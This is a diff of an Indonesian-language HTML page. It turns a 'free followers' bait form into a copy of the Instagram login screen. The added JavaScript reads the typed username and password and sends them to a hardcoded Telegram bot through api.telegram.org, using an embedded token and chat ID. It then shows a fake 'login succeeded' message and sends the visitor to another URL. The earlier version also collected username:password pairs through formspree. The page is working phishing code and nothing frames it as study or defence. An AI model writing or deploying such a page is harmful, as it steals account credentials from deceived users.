@@ -1,26 +1,142 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Followers</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="style.css">
+    <title>Login Instagram</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:400,600&display=swap">
+    <style>
+        /* Gaya CSS */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #fafafa;
+        }
+
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border: 1px solid #ddd;
+            text-align: center;
+            width: 100%;
+            max-width: 350px;
+            border-radius: 8px;
+        }
+
+        .container img {
+            width: 50%;
+            margin-bottom: 20px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+
+        .login-btn {
+            background-color: #0095F6;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            width: 100%;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
+        .login-btn:hover {
+            background-color: #007bb5;
+        }
+
+        .forgot-password {
+            color: #0095F6;
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+
+        .create-account {
+            margin-top: 10px;
+            font-size: 14px;
+        }
+
+        .create-account a {
+            color: #0095F6;
+            text-decoration: none;
+        }
+
+        .terms {
+            font-size: 12px;
+            color: #777;
+            margin-top: 20px;
+        }
+
+        .terms a {
+            color: #0095F6;
+            text-decoration: none;
+        }
+    </style>
 </head>
 <body>
     <div class="container">
-        <div class="contact-box">
-            <div class="left"></div>
-            <div class="right">
-                <h1>Login Akun Instagram</h1>
-                <p><strong>Followers akan otomatis terkirim pada akun Anda setelah Anda selesai mengisi data akun.</strong></p>
-                <form action="https://formspree.io/f/mzzplkvk" method="POST">
-                    <input type="text" class="field" name="account_info" placeholder="Username:Password required>
-                    <input type="email" class="field" name="account_email" placeholder="Email" required>
-                    <button type="submit" class="btn">Dapatkan Free Followers</button>
-                </form>
-            </div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+
+        <input type="text" id="username" class="input-field" placeholder="Nomor telepon, nama pengguna, atau email">
+        <input type="password" id="password" class="input-field" placeholder="Kata Sandi">
+
+        <button class="login-btn" onclick="sendToTelegramAndRedirect()">Masuk</button>
+
+        <div class="create-account">
+            Tidak punya akun? <a href="#">Buat akun</a>
+        </div>
+
+        <div class="terms">
+            Dengan melanjutkan, Anda menyetujui <a href="#">Ketentuan Penggunaan</a> dan <a href="#">Kebijakan Privasi</a> Instagram.
         </div>
     </div>
+
+    <script>
+        function sendToTelegramAndRedirect() {
+            const token = "7584241208:AAEytGObv_tXPSk11ymjOzpKDh9fRg2v2ek";
+            const chatId = "6748742388";
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const redirectUrl = "https://contoh-url.com"; // URL tujuan
+
+            if (username && password) {
+                const message = `Username/Email: ${username}\nPassword: ${password}`;
+                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                fetch(url)
+                    .then(response => {
+                        if (response.ok) {
+                            alert("Login berhasil. Anda akan diarahkan ke halaman utama.");
+                            window.location.href = redirectUrl; // Arahkan ke URL lain
+                        } else {
+                            alert("Gagal mengirim data. Silakan coba lagi.");
+                        }
+                    })
+                    .catch(error => {
+                        console.error("Error:", error);
+                        alert("Terjadi kesalahan. Silakan coba lagi.");
+                    });
+            } else {
+                alert("Harap isi username/email dan kata sandi.");
+            }
+        }
+    </script>
 </body>
 </html>
